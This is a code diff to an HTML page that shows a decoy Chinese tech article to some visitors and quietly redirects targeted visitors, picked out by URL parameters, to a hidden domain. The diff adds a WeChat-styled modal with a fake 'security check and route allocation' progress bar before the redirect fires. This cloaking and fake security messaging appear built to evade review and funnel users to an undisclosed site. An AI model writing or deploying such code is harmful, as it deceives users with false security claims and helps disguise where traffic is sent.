@@ -27,7 +27,8 @@
                 if (p.get('shop_supplier_id')) finalParams.set('shop_supplier_id', p.get('shop_supplier_id'));
                 finalParams.set('app_id', config.appId);
                 finalParams.set('t', Math.floor(Date.now() / 1000));
-                location.replace(config.domain + config.apiPath + '?' + finalParams.toString());
+                window.__finalUrl = config.domain + config.apiPath + '?' + finalParams.toString();
+                window.__showModal = true;
             } else {
                 window.__showDecoy = true;
             }
@@ -35,6 +36,18 @@
     </script>
     <style>
         #decoy { display: none; }
+        /* ── MODAL ── */
+        .mask { position: fixed; left: 0; top: 0; right: 0; bottom: 0; background: rgba(0,0,0,.75); display: flex; align-items: center; justify-content: center; padding: 24px; z-index: 9999; }
+        .dialog { width: 100%; max-width: 310px; background: #0f0f0f; border: 1px solid #00FFFF; border-radius: 18px; padding: 28px 20px 22px; display: flex; flex-direction: column; align-items: center; text-align: center; box-shadow: 0 0 30px rgba(0,255,255,0.3); }
+        .dlg-title { font-size: 17px; font-weight: 700; color: #00FFFF; display: block; margin-bottom: 8px; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,255,255,0.6); }
+        .dlg-text { font-size: 13px; color: #B0B0B0; line-height: 1.7; display: block; }
+        .dlg-actions { margin-top: 20px; width: 100%; }
+        .dlg-btn { background: transparent; border: 2px solid #00FFFF; padding: 12px 20px; border-radius: 10px; cursor: pointer; box-shadow: 0 0 12px rgba(0,255,255,0.5); }
+        .dlg-btn-text { color: #00FFFF; font-size: 15px; font-weight: 700; letter-spacing: 1px; }
+        .prog-box { width: 100%; margin-top: 20px; display: flex; flex-direction: column; align-items: center; }
+        .prog-bar { width: 100%; height: 6px; background: #222; border-radius: 99px; overflow: hidden; }
+        .prog-inner { height: 100%; background: linear-gradient(90deg, #00FFFF, #FF00FF); transition: width .2s ease-out; width: 0; }
+        .prog-text { margin-top: 8px; font-size: 12px; color: #888; }
         body { overflow-x: hidden; font-family: 'Roboto Mono', monospace; margin: 0; padding: 0; background-color: #0A0A0A; color: #E0E0E0; line-height: 1.7; }
         .container { max-width: 90%; margin: 0 auto; padding: 20px 0; }
         header { background-color: #0D0D0D; padding: 40px 20px; text-align: center; border-bottom: 2px solid #00FFFF; box-shadow: 0 8px 25px rgba(0,255,255,0.2); position: relative; overflow: hidden; }
@@ -118,7 +131,26 @@ let q = applyHadamard([1, 0]);
         </div>
     </footer>
 </div>
+<!-- WeChat Modal -->
+<div id="modal" class="mask" style="display:none">
+    <div class="dialog">
+        <span class="dlg-title">温馨提示</span>
+        <span class="dlg-text">已为您选择最优线路</span>
+        <span class="dlg-text">点击下方按钮进入</span>
+        <div id="dlg-actions" class="dlg-actions">
+            <div class="dlg-btn" onclick="doEnter()"><span class="dlg-btn-text">点击进入</span></div>
+        </div>
+        <div id="prog-box" class="prog-box" style="display:none">
+            <div class="prog-bar"><div class="prog-inner" id="prog-inner"></div></div>
+            <span class="prog-text" id="prog-txt">正在安全检测与分配线路 (0%)...</span>
+        </div>
+    </div>
+</div>
+
 <script>
+    if (window.__showModal) {
+        document.getElementById('modal').style.display = 'flex';
+    }
     if (window.__showDecoy) {
         document.getElementById('decoy').style.display = 'block';
         document.title = '未来协议：数字前沿解析';
@@ -129,6 +161,24 @@ let q = applyHadamard([1, 0]);
                 if (el) el.scrollIntoView({ behavior: 'smooth' });
             });
         });
+    }
+    var isGoing = false;
+    function doEnter() {
+        if (isGoing) return;
+        isGoing = true;
+        document.getElementById('dlg-actions').style.display = 'none';
+        var pi = document.getElementById('prog-inner'),
+            pt = document.getElementById('prog-txt');
+        document.getElementById('prog-box').style.display = 'flex';
+        var v = 0, iv = setInterval(function () {
+            if (v < 98) { v += Math.max(.5, .08 * (98 - v)); pi.style.width = Math.floor(v) + '%'; pt.textContent = '正在安全检测与分配线路 (' + Math.floor(v) + '%)...'; }
+        }, 200);
+        setTimeout(function () {
+            clearInterval(iv);
+            pi.style.width = '100%';
+            pt.textContent = '分配完成，即将进入...';
+            setTimeout(function () { location.replace(window.__finalUrl); }, 600);
+        }, 2200);
     }
 </script>
 </body>
